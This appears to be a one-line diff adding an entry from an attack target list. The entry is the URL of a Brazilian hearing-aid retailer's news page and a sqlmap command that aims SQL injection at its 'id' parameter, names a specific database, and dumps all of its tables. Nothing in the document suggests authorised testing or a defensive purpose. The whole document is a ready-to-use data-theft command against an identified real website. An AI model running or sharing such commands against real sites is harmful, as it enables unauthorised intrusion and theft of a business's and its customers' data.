@@ -1,0 +1,1 @@
+http://www.aparelhoauditivo.com.br/noticias-detalhes.php?id=81 (GET)  # sqlmap.py -u http://www.aparelhoauditivo.com.br/noticias-detalhes.php?id=81 -D aparelhoauditi03 --tables --dump-all --threads 5 -v3
